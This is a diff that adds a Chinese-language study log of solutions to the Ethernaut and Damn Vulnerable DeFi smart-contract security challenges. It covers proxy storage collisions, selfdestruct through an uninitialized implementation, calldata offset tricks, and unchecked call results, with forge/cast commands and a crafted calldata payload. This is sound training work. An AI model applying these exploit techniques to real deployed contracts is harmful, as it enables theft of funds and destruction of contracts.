@@ -526,4 +526,683 @@ bytes32 N = bytes32(uint256(array_index_that_occupied_the_slotMAX) + 1)
 - [Ethernaut23-DexTwo.s.sol](/Writeup/DeletedAccount/Ethernaut23-DexTwo.s.sol)
 
 
+### 2024.09.05
+
+- 09.04 身體不舒服，請假一天
+- Day6 共學開始
+
+#### [Ethernaut-24] Puzzle Wallet
+
+個人覺得這一題十分有趣，屬於必看必解題！
+
+- 破關條件: 把 `PuzzleProxy` 的 `admin` 變成自己
+- 解法:
+  - 可以看到 `PuzzleProxy` 是一個 UpgradeableProxy，Logic 合約是 `PuzzleWallet`
+  - 當涉及到 Proxy 的時候，通常都會去檢查 Storage Layout
+  - 可以發現到 `PuzzleProxy.pendingAdmin` 對應的是 `PuzzleWallet.owner`
+  - 可以發現到 `PuzzleProxy.admin` 對應的是 `PuzzleWallet.maxBalance`
+  - 這意味著我們必須要能在 `PuzzleWallet` 找到地方可以操縱 `PuzzleWallet.maxBalance`，使它的數值變成我們的錢包地址
+  - `PuzzleWallet.maxBalance` 可以在 `PuzzleWallet.init()` 函數與 `PuzzleWallet.setMaxBalance()` 函數進行更改
+  - `PuzzleWallet.init()` 這一條路應該是沒辦法走的，因為 `PuzzleWallet.maxBalance` 的值已經是設置成 `PuzzleWallet.admin` 了
+  - 我們只能嘗試走 `PuzzleWallet.setMaxBalance()` 這條路，但這要求我們要是 whitelisted 以及 `address(this).balance` 為 0
+  - 要怎麼成為 whitelisted 呢? 我們必須要使 `msg.sender == owner` 
+  - `PuzzleWallet.owner` 被宣告在 slot0，也就是與 `PuzzleProxy.pendingAdmin` 對應
+  - `PuzzleProxy.pendingAdmin` 可以透過 `PuzzleProxy.proposeNewAdmin()` 進行修改
+  - 總結目前發現：我們可以透過 `PuzzleProxy.proposeNewAdmin()` 函數的調用，使 `PuzzleWallet.owner` 被修改，進而使我們成為 `whitelisted`
+  - `onlyWhitelisted` 的問題解決掉了，下一步是找到方式讓 `address(this).balance == 0` 條件敘述通過
+  - 透過 `cast balance -r $RPC_OP_SEPOLIA $PUZZLEWALLET_INSTANCE` 指令，可以得知 `PuzzleProxy` 合約有 0.001 顆 ETH
+  - 從題目給出的代碼來看，也似乎只有 `execute()` 函數可以把 ETH 提領出來，所以這應該會是我們要嘗試的漏洞利用路徑
+  - `execute()` 函數要求我們必須使 `balances[msg.sender]` 大於欲提領的數量，意味著我們必須先使自己的 `balances[msg.sender]` 增加至 0.001 ETH
+  - 要增加 `balances[msg.sender]` 必須透過 `deposit()` 函數
+  - 由於 `PuzzleWallet.maxBalance` 等同於 `PuzzleProxy.admin`，所以 `address(this).balance <= maxBalance` 的條件敘述基本上不會正常工作
+  - 但問題在於: 我們 `deposit()` 存入 0.001 顆 ETH，也只能 `execute()` 提領出來 0.001 顆 ETH
+  - 似乎怎麼操作都會使 `PuzzleProxy` 的餘額仍然剩餘 0.001 ETH，如何繞過呢？我們可以利用 `multicall()` 函數裡的 `deletecall()`！
+  - 我們需要建構出一條 deletegatecall 鏈
+    - 首先 `PuzzleProxy` 會 delegatecall `PuzzleWallet` 的函數
+    - 我們指定 delegatecall `PuzzleWallet.multicall()`
+    - 在 `multicall()` 裡面，我們利用 `multicall()` 裡面的 delegatecall 來呼叫 `deposit()` 函數
+    - 呼叫 `deposit()` 的時候，要帶入 0.001 ETH 進去
+      - 此時 msg.sender 是我們的錢包
+      - 此時 msg.value 等於 0.001 ETH
+    - 我們透過第二組 `data` 再次呼叫 `multicall()`
+    - 第二組的 `multicall()` 再次呼叫 `deposit()`
+      - 此時 msg.sender 依舊是我們的錢包
+      - 此時 msg.value 依舊等於 0.001 ETH **(但是我們並沒有因此多提供了 0.001 ETH)**
+    - 第二組 `multicall()` 之所以可以再次呼叫 `deposit()`，是因為 `depositCalled` 的狀態值只存在於當前的 Call Frame
+      - `depositCalled`  是一個假的重入鎖，實際上根本不起作用，因為 `depositCalled = True` 的這個狀態，只存在於當前的 Call Stack
+- 解法總結:
+  1. 呼叫 `PuzzleProxy.proposeNewAdmin(_newAdmin=tx.origin)`  (使 `tx.origin` 成為了 `PuzzleWallet.owner`)
+  2. 呼叫 `PuzzleProxy.addToWhitelist(addr=tx.origin)` (使 `tx.origin` 變成了 `whitelisted`)
+  3. 建構 `PuzzleWallet.multicall()` 的 `bytes[] data`
+     1. 總共有兩組 `bytes data` 需要建構
+     2. 第一組: `deposit()`
+     3. 第二組 `multicall(deposit())`
+  4. 呼叫 `PuzzleProxy.multicall()`，並且帶入 `msg.value = 0.001 ETH`
+  5. 呼叫 `PuzzleProxy.execute(to=tx.origin, value=0.002 ETH, data="")` (把 0.002 ETH 提領出來，使 `PuzzleProxy` 的以太幣餘額歸零)
+  6. 呼叫 `PuzzleProxy.setMaxBalance(_maxBalance=uint256(uint160(tx.origin)))` (用來覆蓋 `PuzzleProxy.admin`)
+  7. 過關！
+- 知識點: Delegate Call, Storage Slot Collision
+- 
+
+
+解法:
+
+- [Ethernaut24-PuzzleWallet.sh](/Writeup/DeletedAccount/Ethernaut24-PuzzleWallet.sh)
+- [Ethernaut24-PuzzleWallet.s.sol](/Writeup/DeletedAccount/Ethernaut24-PuzzleWallet.s.sol)
+
+#### [Ethernaut-25] Motorbike
+
+個人覺得這一題十分有用，屬於必看必解題！
+
+**此關卡在 Dencun 升級後無法被解掉，因為 Dencun 升級後，不允許 selfdestruct() 清空合約代碼** (除非欲 selfdestruct 的合約是在同一個 Transaction 創建的)
+
+- 破關條件: 把 `Engine` 合約自毀掉
+- 解法:
+  - Instance 將會是 `Motorbike` 合約
+  - 透過觀察 `Motorbike` 合約，我們可以觀察到它的 `constructor()` 調用了 `Engine.initialize()` 函數
+  - 在 `Engine.initialize()` 函數內，我們可以觀察到它為 `Motorbike` 的 slot0 和 slot1 分別設置了 `1000` 與 `msg.sender`
+    - 我們可以透過以下指令驗證這件事:
+    - `cast storage -r $RPC_OP_SEPOLIA $MOTORBIKE_INSTANCE 0` -> msg.sender
+    - `cast storage -r $RPC_OP_SEPOLIA $MOTORBIKE_INSTANCE 1 | cast to-dec` -> 1000
+  - 如果要讓 `Engine` 自毀掉，我們必須找到一個地方，可以以 `Engine` 的 context 去呼叫自毀合約的邏輯代碼
+  - 這個任意執行代碼的觸發點，看起來在 `Engine._upgradeToAndCall()` 函數內
+    - 但 `Engine._upgradeToAndCall()` 是 internal 函數
+  - 我們只能透過 `Engine.upgradeToAndCallI()` 函數來訪問它
+  - 但是我們必須要通過 `require(msg.sender == upgrader)` 的檢查，意味著我們得先讓自己成為 `upgrader`
+  - 只有 `Engine.initialize()` 可以設置 upgrader，也就是 `Motorbike` 的 slot0
+  - 漏洞點在於 `Engine` 本身也是一個部署在網路上的 Logic 合約
+  - 但是 `initialize()` 函數只會經過 `initializer` 這個 modifier 的檢查
+  - `initializer` 簡單來說會檢查當前這個合約的 context 是不是已經被 initialized
+  - 如果沒有被 initialized，則 `initializer` 的檢查通過，可以繼續進行被掛載了 `initializer` modifier 的合約
+    - 具體來說，代碼可以參考這裡 https://github.com/openzeppelin/openzeppelin-contracts/blob/8e02960/contracts/proxy/Initializable.sol#L36
+  - 但是回過頭來看 `Motorbike` 合約是使用 delegatecall 來進行 `Engine.initialize()`
+  - **這意味著只有 `Motorbike` 被 initialized 了，但是 `Engine` 本身並沒有被 initialized**
+    - 請記住: `Engine` 本身也是部署在網路上的一個合約
+  - 所以此時我們如果直接呼叫 `Engine.initialize()` (a.k.a. 不透過 `Motorbike`) 是可以呼叫成功的
+    - 因為 `Initializable` 這個抽象合約的 `require(_initializing || _isConstructor() || !_initialized)` 檢查會通過
+  - 於是我們就可以成功變成 `upgrader`
+  - 變成了 `Engine.upgrader` (Motorbike.slot0) 之後，我們就可以呼叫 `Engine.upgradeToAndCall()` 了
+  - 我們可以呼叫 `Engine._upgradeToAndCall()` 使 `Engine` 執行我們部署好的合約的 `selfdestruct` 指令了
+- 解法總結:
+  - 我們需要先寫一個 `BustingEngine` 合約
+  - 裡面有一個會執行 `selfdestruct()` 的函數，我們就叫它 `bust()` 好了。
+  - 用自己的錢包，呼叫 `Engine.initialize()`，使自己的錢包成為 `upgrader`。
+    - `Engine` 合約地址，可以透過 `cast storage -r $RPC_OP_SEPOLIA $MOTORBIKE_INSTANCE 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc` 找到
+  - 用自己的錢包，呼叫 `Engine.upgradeToAndCall(newImplementation＝BustingEngine, data="bust()")`
+    - `Engine` 會透過 delegatecall 借用我們的 `selfdestruct()` 邏輯代碼，把自己銷毀掉
+  - 過關！
+    - 過程中我們除了需要和 `Motorbike` 獲取 `Engine` 的實際合約地址以外，基本上不需要和 `Motorbike` 互動。
+  
+解法:
+
+- [Ethernaut25-Motorbike.sh](/Writeup/DeletedAccount/Ethernaut25-Motorbike.sh)
+- [Ethernaut25-Motorbike.s.sol](/Writeup/DeletedAccount/Ethernaut25-Motorbike.s.sol)
+
+### 2024.09.06
+
+
+#### [Ethernaut-26] DoubleEntryPoint
+
+- 卡關了...沒看得很懂這題要做什麼才能過關，先跳過，改天再回頭看
+- 明天要比工作日還要早起出門上課，先解 Ethernaut-27 水題當作簽到...
+
+
+#### [Ethernaut-27] Good Samaritan
+
+- 破關條件: 把 `Wallet` 合約的 `Coin.balances`  清空
+- 解法:
+  - 已知我們可以透過 `GoodSamaritan.requestDonation() -> Wallet.donate10()` 把幣取走，但這意味著我們得呼叫 100000 次才能過關，太慢了
+  - 除了 `Wallet.donate10()` 以外，還有 `Wallet.transferRemainder()` 可以直接把所有 balances 轉走，這應該就是我們要找到的利用點
+  - 我們要找到一個地方使得 `Wallet.transferRemainder()` 被觸發，進而過關
+  - 要做到這件事，只能使 `if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err))` 敘述返回 True
+  - 這意味著我們要在 `try wallet.donate10(msg.sender)` 的執行過程中想辦法觸發 `NotEnoughBalance()` 這個 custom error
+  - 只要 `dest_` 是一個合約，我們就可以使 `Coin.transfer()` 呼叫 callback function: `INotifyable(dest_).notify(amount_);`
+  - 然後我們在 `INotifyable(dest_).notify(amount_);` 的執行過程中觸發 `NotEnoughBalance()` custom error 就好了！
+- 解法總結:
+  - 寫一個合約，它會呼叫 `GoodSamaritan.requestDonation()`
+  - 這個合約需要實現一個 `notify(uint256)` 函數
+  - 這個 `notify(uint256)` 函數會無條件地觸發 `NotEnoughBalance()` custom error
+
+吐槽: 這題居然三顆星...前一題解不出來，它居然只有兩顆星？？？囧
+
+- [Ethernaut27-GoodSamaritan.sh](/Writeup/DeletedAccount/Ethernaut27-GoodSamaritan.sh)
+- [Ethernaut27-GoodSamaritan.s.sol](/Writeup/DeletedAccount/Ethernaut27-GoodSamaritan.s.sol)
+
+### 2024.09.07
+
+- 今天上防衛課一整天，爆幹累
+- 但還是要要求自己至少解一題...
+
+#### [Ethernaut-28] Gatekeeper Three
+
+打開題目後快速掃了一下，感覺是最簡單的 Gatekeeper，應該是要複習前面學到的內容。
+
+- 破關條件：通過 `enter()` 的三道 modifier 考驗，使自己成為一個 entrant
+- 解法:
+  - `gateOne()`，沒什麼難的
+    - 需要寫一個合約，呼叫 `construct0r()` 使自已的合約(`msg.sender`)成為 `owner`
+  - `gateTwo()`，使 `allowEntrance` 為 True
+    - 需要呼叫 `trick.checkPassword(_password)` 並使它返回 True
+    - 但 `trick` 此時還沒被賦值，所以要先呼叫 `createTrick()` 使 `trick` 被 new 出來
+    - 然後，再呼叫 `SimpleTrick.checkPassword(_password)`
+      - `password` 是 private 的，所以我們不太能直接用 Solidity 呼叫得到
+      - 但我們可以用 `eth_getStorage` 先在鏈下拿到 password
+      - 意味著我們要先呼叫 `GatekeeperThree.createTrick()` 再執行一系列操作
+    - `gateThree()` 要求 `GatekeeperThree` 合約至少有 0.001 ETH 以上
+      - 並且轉回來給攻擊合約是失敗的
+      - 這意味著我們要寫一個 `receive()` 函數，裡面返回 False
+      - 我們可以直接用 `revert()` 來做到 `.send()` 會返回 False 這件事
+  - 解法整理:
+    - 寫一個攻擊合約
+    - 攻擊合約會先呼叫 `GatekeeperThree.createTrick()`
+    - 然後用 `eth_getStorage` 獲取到 `SimpleTrick.slot2` 的內容值，作為 `password`
+    - 呼叫 `GatekeeperThree.getAllowance(password)` 把 `password` 帶進去
+    - 呼叫 `GatekeeperThree.construct0r()` 使攻擊合約成為 `owner`
+    - 給 `GatekeeperThree` 0.001 以上的 ether
+    - 攻擊合約也需要寫一個 `receive()` 函數，裡面只有寫了一行 `revert()`
+    - 完成，呼叫 `enter()` 來過關！
+
+- [Ethernaut28-GatekeeperThree.sh](/Writeup/DeletedAccount/Ethernaut28-GatekeeperThree.sh)
+- [Ethernaut28-GatekeeperThree.s.sol](/Writeup/DeletedAccount/Ethernaut28-GatekeeperThree.s.sol)zz
+
+過程中好像 Submit Instance 按太快，導致關卡通過一直失敗，一頭霧水XD
+
+### 2024.09.09
+
+- 繼續進行每日解一題挑戰
+
+#### [Ethernaut-29] Switch
+
+主要是考 Calldata 的 Layout 的一題，不難，值得一看。
+
+- 破關條件：使 `switchOn` 為 True。
+- 解法:
+  - 為了使 `switchOn` 為 True，我們必須使 `Switch` 合約自己呼叫 `turnSwitchOn()` 函數
+  - 由於存在 `onlyThis` modifier 的關係，我們唯一的進入點是 `flipSwitch(bytes memory _data)` 函數
+  - 我們必須透過 `.call(_data)` 來調用 `turnSwitchOn()` 但同時通過 `onlyOff` 的檢查
+  - `onlyOff` 會檢查從 calldata 起開始算，第 68 bytes 到第 72 bytes 必須是 `turnSwitchOff()` 的 selector。(也就是 `0x20606e15`)
+
+- 我們可以試著把 `flipSwitch(bytes memory _data)` 拆解出來，看它的整段 calldata 預計會長什麼樣子：
+- 每一行都是一段 32bytes 資料
+
+```
+30c13ade                                                         # flipSwitch(bytes memory _data)
+???????????????????????????????????????????????????????????????? # 暫時留空，待會填入
+???????????????????????????????????????????????????????????????? # 暫時留空，待會填入
+20606e1500000000000000000000000000000000000000000000000000000000 # turnSwitchOff()
+```
+
+- 好的，我們找到 `turnSwitchOff()` 要塞在哪裡了，接下來要把 `bytes memory _data` 的偏移量(offset)和長度(length)填進去
+- 偏移量是什麼？偏移量代表從 calldata 的起點，要離多遠才會指到 `bytes memory _data` 的長度(length)
+- 記住: 動態資料結構的 Layout 是 `offset + length + data`
+
+```
+30c13ade                                                         # flipSwitch(bytes memory _data)
+0000000000000000000000000000000000000000000000000000000000000020 # bytes memory _data 的偏移量。從 0 點加上 32 bytes 可以指向 length 所以是 0x20
+0000000000000000000000000000000000000000000000000000000000000004 # bytes memory _data 的長度，總長度只有 4 bytes
+20606e1500000000000000000000000000000000000000000000000000000000 # turnSwitchOff()
+```
+
+- 好的，目前我們已經可以成功通過 `onlyOff` 的檢查了。可是我們要怎麼利用 `address(this).call(_data)` 來呼叫到 `turnSwitchOn()` 函數呢？
+- 我們可以回頭整理一下，目前 `_data` 會是什麼資料:
+
+```
+0000000000000000000000000000000000000000000000000000000000000020 # bytes memory _data 的偏移量。從 0 點加上 32 bytes 可以指向 length 所以是 0x20
+0000000000000000000000000000000000000000000000000000000000000004 # bytes memory _data 的長度，總長度只有 4 bytes
+20606e1500000000000000000000000000000000000000000000000000000000 # turnSwitchOff()
+```
+
+- 誒...既然程式不會對**偏移量**和**資料長度**做任何檢查，是不是意味著我們可以直街操縱偏移量和長度，使它執行我們想要執行的任何函數呢？
+- 畢竟只要不動到 `turnSwitchOff()` calldata 的位置就好了，動到它就通過不了 `onlyOff` 的檢查了。
+- 試著自己構造看看:
+
+```
+30c13ade                                                         # flipSwitch(bytes memory _data)
+???????????????????????????????????????????????????????????????? # 原先 bytes memory _data 的偏移量，暫時留空，待會填入
+???????????????????????????????????????????????????????????????? # 原先 bytes memory _data 的長度，暫時留空，待會填入
+20606e1500000000000000000000000000000000000000000000000000000000 # turnSwitchOff()
+???????????????????????????????????????????????????????????????? # 暫時留空，待會填入
+76227e1200000000000000000000000000000000000000000000000000000000 # turnSwitchOn()
+```
+
+- 好的，現在把呼叫 `address(this).call(_data)` 裡面的 `_data` 的前 4 bytes 放進來了
+- 接下來一樣需要調整這一段 `_data` 的總長度:
+
+```
+30c13ade                                                         # flipSwitch(bytes memory _data)
+???????????????????????????????????????????????????????????????? # 原先 bytes memory _data 的偏移量，暫時留空，待會填入
+???????????????????????????????????????????????????????????????? # 原先 bytes memory _data 的長度，暫時留空，待會填入
+20606e1500000000000000000000000000000000000000000000000000000000 # turnSwitchOff()
+0000000000000000000000000000000000000000000000000000000000000004 # 這裡代表 turnSwitchOn() 的 4bytes 長度
+76227e1200000000000000000000000000000000000000000000000000000000 # turnSwitchOn()
+```
+
+- 有了 `address(this).call(_data)` 的 `_data` 的長度之後，需要再調整 offset
+
+```
+30c13ade                                                         # flipSwitch(bytes memory _data)
+0000000000000000000000000000000000000000000000000000000000000060 # bytes memory _data 的偏移量，跳轉到加料過的 calldata 長度定位點
+???????????????????????????????????????????????????????????????? # 原先 bytes memory _data 的長度，暫時留空，待會填入
+20606e1500000000000000000000000000000000000000000000000000000000 # turnSwitchOff()
+0000000000000000000000000000000000000000000000000000000000000004 # 這裡代表 turnSwitchOn() 的 4bytes 長度
+76227e1200000000000000000000000000000000000000000000000000000000 # turnSwitchOn()
+```
+
+- 原先 bytes memory _data 的長度，已經不重要了，因為我們已經用新的長度定位點來取代
+- 所以留空就好
+- 最後我們得到:
+
+```
+30c13ade                                                         # flipSwitch(bytes memory _data)
+0000000000000000000000000000000000000000000000000000000000000060 # bytes memory _data 的偏移量，跳轉到加料過的 calldata 長度定位點
+0000000000000000000000000000000000000000000000000000000000000000 # 原先 bytes memory _data 的長度，已經不重要，亂填都可以
+20606e1500000000000000000000000000000000000000000000000000000000 # turnSwitchOff()
+0000000000000000000000000000000000000000000000000000000000000004 # 這裡代表 turnSwitchOn() 的 4bytes 長度
+76227e1200000000000000000000000000000000000000000000000000000000 # turnSwitchOn()
+```
+
+- 最後我們用來發起呼叫 `flipSwitch(bytes memory _data)` 的 `_data` 就是:
+
+```solidity=
+bytes memory data = hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000"
+```
+
+- 完成！
+
+- [Ethernaut29-Switch.sh](/Writeup/DeletedAccount/Ethernaut29-Switch.sh)
+- [Ethernaut29-Switch.s.sol](/Writeup/DeletedAccount/Ethernaut29-Switch.s.sol)
+
+### 2024.09.10
+
+- 繼續進行每日解一題挑戰
+
+#### [Ethernaut-30] HigherOrder
+
+- 過關條件: 使 `treasury` 的內容值變成大於 255
+- 解法:
+  - 這題的關鍵點在於 `pragma solidity 0.6.12;`
+  - 在 Solidity 0.8.0 以前，編譯器用的是 `ABIEncoderV1`
+  - 使用 `ABIEncoderV1` 意味著編譯出來的合約，並不會對 calldata 做邊界檢查
+  - https://docs.soliditylang.org/en/v0.8.1/080-breaking-changes.html?highlight=abicoder#silent-changes-of-the-semantics
+  - 所以我們手動建構 calldata 丟進去就可以了，不用管 calldata 有 `uint8` 的限制
+  - 要修復此問題，我們可以在合約指定 `pragma experimental ABIEncoderV2;` 即可
+  - 我做了兩個版本的 forge 腳本，一個是 for 通關用的
+    - `forge script Ethernaut30-Switch.s.sol:Solver -f $RPC_OP_SEPOLIA -vvvv --broadcast`
+  - 另一個是相同的通關腳本，但是使用了上 patch 的關卡，執行下去可以發現會 `revert()`
+    - `forge script Ethernaut30-Switch.s.sol:SolverV2 -f $RPC_OP_SEPOLIA -vvvv`
+
+- [Ethernaut30-HigherOrder.sh](/Writeup/DeletedAccount/Ethernaut30-HigherOrder.sh)
+- [Ethernaut30-HigherOrder.s.sol](/Writeup/DeletedAccount/Ethernaut30-HigherOrder.s.sol)
+- [Ethernaut30-HigherOrderV2.sol](/Writeup/DeletedAccount/Ethernaut30-HigherOrderV2.sol)
+
+
+### 2024.09.11
+
+- 繼續進行每日解一題挑戰
+
+#### [Ethernaut-31] Stake
+
+- 過關條件:
+  1. `Stake` 合約內的以太幣餘額大於 0
+  2. `totalStaked` 必須大於 `Stake` 合約的以太幣餘額
+  3. 我們必須成為一個 `Stakers`
+  4. 我們的 `UserStake` 必須為 0
+- 解法:
+  - 這個合約是 Solidity 0.8.0 編譯的，所以 overflow/underflow 看起來是不可行了
+    - 所以看起來 `StakeETH()` 沒什麼漏洞
+  - `Unstake()` 看起來有一個小問題: 沒有要求 `bool success` 必須為 True
+  - `0xdd62ed3e` 是 `allowance(address,address)`
+  - `0x23b872dd` 是 `transferFrom(address,address,uint256)`
+  - 由於沒有給出 `WETH` 的代碼，我們就先樂觀地假定它是一個正常的 ERC20 合約，漏洞不出在它身上
+  - `(,bytes memory allowance) = WETH.call(abi.encodeWithSelector(0xdd62ed3e, msg.sender,address(this)));` 這邊沒有檢查 call 是否成功，只有把 return value 當作 uint256 做後續處理
+  - 由於不清楚 `WETH.allowanapprovece(address,address)` 的具體實現方式，所以我們也不知道 `allowance` 究竟會是什麼值
+  - 但是題目說明提示我們要看 ERC20 的實現方式，我們可以樂觀的認為 WETH 應該也是個繼承了 ERC20 的合約
+  - `bytesToUint(bytes memory data)` 函數看起來也挺正常的，漏洞應該不在這裡。
+  - **`(bool transfered, ) = WETH.call(abi.encodeWithSelector(0x23b872dd, msg.sender,address(this),amount));` 沒有檢查 transfered 是否成功，即便 `transfered == false` 也給過！！!**
+  - 這意味著我們有沒有 WETH 都沒差
+    - 從這一個思路往下看，似乎也沒有任何地方聲明有發給我們一些 `WETH`
+  - 那我們就可以從這一點開始思考怎麼建構 exploit 了
+- 解法總結:
+  - 使用我們自己的 EOA 錢包
+    - 呼叫 `StakeETH{value: 0.001 ether + 1}()` 來滿足條件 1 和 3
+    - 呼叫 `Unstake(amount=0.001 ether + 1)` 來滿足條件 4，但同時取消滿足了 1
+    - 目前只有滿足 3 和 4，我們先來思考怎麼滿足條件 2
+  - 寫一個合約 (為了不要使用 EOA 錢包，保持滿足條件 4)
+    - 呼叫 `StakeWETH(amount=0.001 ether + 1)` 來滿足條件 2
+      - 在這之前會需要呼叫 `approve(address,uint256)`
+    - 呼叫 `StakeETH()` 然後在 `Unstake()` 來滿足條件 1
+      - 記得要保留 1 wei 在裡面才能滿足條件 1
+  - 把合約 `destruct()` 掉，把過程中用到的 0.001 ether 轉回來給 EOA
+
+- [Ethernaut31-Stake.sh](/Writeup/DeletedAccount/Ethernaut31-Stake.sh)
+- [Ethernaut31-Stake.s.sol](/Writeup/DeletedAccount/Ethernaut31-Stake.s.sol)
+
+
+### 2024.09.12
+
+- 繼續進行每日解一題挑戰
+
+#### [DamnVulnerableDeFi-01] Unstoppable
+
+- 過關條件: 使 `_isSolved()` 通過執行
+- 合約代碼解讀筆記:
+  - 從 `_isSolved()` 的代碼注視我們可以觀察到，我們需要使 `Monitor.checkFlashLoan()` 的 [vault.flashLoan()](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/src/unstoppable/UnstoppableMonitor.sol#L41) 拋出 Error
+    - 這樣才能使 `Vault` 被 paused 並且 transferOwner 給 deployer
+  - 所以，我們基本上只需要重點關注 `Vault.flashLoan()` 裡面的漏洞即可，其他的程式碼大概都是煙霧彈
+  - 有四個地方可以讓 `Vault.flashLoan()` 執行過程中拋出錯誤
+    1. revert InvalidAmount(0);
+    2. revert UnsupportedCurrency();
+    3. revert InvalidBalance();
+    4. revert CallbackFailed();
+  - `revert InvalidAmount(0);` 這個不可能，因為 Monitor 已經在[這裡](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/test/unstoppable/Unstoppable.t.sol#L106)把 amount 寫死了
+  - `revert UnsupportedCurrency();` 也不可能，因為 Monitor 一樣在[這裡](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/src/unstoppable/UnstoppableMonitor.sol#L39)寫死了，這裡的 `.asset()` 是一個 `immutable`，完全沒有操縱的可能性
+  - `revert CallbackFailed();` 基本上也不太可能
+    - 因為看起來 `Monitor.UnexpectedFlashLoan()` error 也基本上沒辦法被 `Vault` 合約觸發到
+  - 唯一比較有機會的感覺是觸發 `revert InvalidBalance();`
+  - 這可能會需要我們操縱 `balanceBefore`
+  - 順帶一提，有 `balanceBefore` 但是沒有 `balanceAfter` 本身感覺就蠻奇怪的
+  - 已知 `balanceBefore` 可以視為 `asset.balanceOf(address(this))`
+  - 即: 在 `Vault` 提供呼叫者 flashLoan 之前，Vault 持有多少個 `asset`
+  - 現在思考的點: **如何使 Monitor 在呼叫 `Vault.flashLoan()` 的時候，使 [convertToShares(totalSupply) != balanceBefore](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/src/unstoppable/UnstoppableVault.sol#L85) 返回 True?**
+  - 我們從 `Vault` 的程式碼中可以觀察到一件事: **這個合約基本上不存在對 ERC4626 的 supply 和 shares 的額外操作**
+  - 那麼就意味著沒意外的話，我們可以認為 `convertToShares(totalSupply)` 是**樂觀地**假定返回值會始終等於 `Vault` 合約持有的 DVT 代幣數量
+  - 但萬一 Vault 持有的 DVT 代幣數量已經被操縱了呢？那麼 `convertToShares(totalSupply)` 的返回值就會和 `Vault` 合約實際持有的 DVT 代幣數量對不上
+  - 對不上的話，任何人來呼叫 `Vault.flashLoan()` 就都會拋出 `InvalidBalance()` Error
+- 解法整理:
+  - 利用關卡一開始發給我們的 10 顆 DVT 代幣
+  - 把這 10 顆 DVT 代幣轉帳給 `Vault` 合約
+  - 使它 `convertToShares(totalSupply) == balanceBefore == asset.balanceOf(address(this))` 對不上來
+  - 對不上來的時候，就會讓任何人(包含`Monitor`)呼叫 `Vault.flashLoan()` 時，拋出 `revert InvalidBalance();`
+  - 當 Monitor 遇到 `revert InvalidBalance();` error 的時候，就會把 `Vault` paused 掉、把 owner 轉回給 `deployer`
+- 解法代碼:
+
+```solidity
+function test_unstoppable() public checkSolvedByPlayer {
+    token.transfer(address(vault), 10e18);
+}
+```
+
+- 心得: 哎呀，解法其實超簡單，Damn Vulnerable DeFi 系列感覺是花更多時間在理解題目的代碼在寫什麼，蠻考驗 Code Review/Audit 的能力...
+
+- [DamnVulnerableDeFi-01-Unstoppable.t.sol](/Writeup/DeletedAccount/DamnVulnerableDeFi-01-Unstoppable.t.sol)
+
+### 2024.09.13
+
+- 繼續進行每日解一題挑戰
+
+#### [DamnVulnerableDeFi-02] Naive receiver
+
+- 過關條件: 把 `NaiveReceiverPool` 和 `FlashLoanReceiver` 合約的 WETH 餘額全部轉到題目指定的 recovery 帳號
+  - `NaiveReceiverPool` 有 1000 顆 WETH
+  - `FlashLoanReceive` 有 10 顆 WETH
+- 合約代碼解讀筆記:
+  - 從題目名稱來猜測，這題大概率是一個"輸入參數未經驗證"之類的漏洞
+  - 既然要榨乾 `NaiveReceiverPool` 和 `FlashLoanReceiver` 合約的餘額，那首先看一下有沒有相關代碼可以觸發這件事
+  - 只有三個地方可以做到這件事:
+    1. [flashLoan() 函數的 weth.transfer(address(receiver), amount);](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/src/naive-receiver/NaiveReceiverPool.sol#L50)
+    2. [flashLoan() 函數的 weth.transferFrom(address(receiver), address(this), amountWithFee);](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/src/naive-receiver/NaiveReceiverPool.sol#L58) 可以把 `FlashLoanReceiver` 合約的餘額轉走
+    3. [withdraw() 函數的 weth.transfer(receiver, amount);](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/src/naive-receiver/NaiveReceiverPool.sol#L72)
+  - `NaiveReceiverPool` 合約的 external 函數都沒有什麼訪問限制(沒有modifier)，只有驗證傳入的 `token` 是否為 WETH 而已
+  - `FlashLoanReceiver` 看起來有一個可能觸發 overflow/underflow 的地方 [amountToBeRepaid = amount + fee;](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/src/naive-receiver/FlashLoanReceiver.sol#L31)
+    - 但是，實際上好像沒什麼用。
+    - 原本想讓 `FlashLoanReceiver` approve 10 顆 WETH 給 `NaiveReceiverPool`，然後 `NaiveReceiverPool` 就有 1000 + 10 WETH 可以被轉走。
+    - 這條路看起來是行不通的。畢竟 Pool 只是 transferFrom 了原本發起的借款額 + 1 顆 WETH，`FlashLoanReceiver` 原本持有的 10 顆還是會繼續留在 `FlashLoanReceiver`。
+  - 那麼，要把 `FlashLoanReceiver` 的 10 顆 WETH 榨乾，看起來只剩下透過 `flashLoan()` 的 `FIXED_FEE`，一點一點地把 Receiver 的 WETH 轉到 Pool 去。
+  - 所以 `FlashLoanReceiver` 需要發起 10 次 `flashLoan()` 來把自己的 WETH 當作 Fee 被 Pool 收繳走
+  - 然後我們再來想辦法把 `NaiveReceiverPool` 持有的 WETH 榨乾。
+  - 要把 `NaiveReceiverPool` 持有的 WETH 榨乾，從剛剛的分析我們可以知道透過 `flashLoan()` 基本上是行不通的。
+    - 因為即使 `transfer()` 1000 顆走，還是會被 `transferFrom()` 1000+1 顆回來
+  - 所以唯一的路剩下 `withdraw()`
+  - 我們先看 `totalDeposits -= amount;` 是否可能不夠扣
+  - [在 deploy `NaiveReceiverPool` 的時候，`totalDeposits` 也增加了 1000 顆 WETH](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/test/naive-receiver/NaiveReceiver.t.sol#L45)
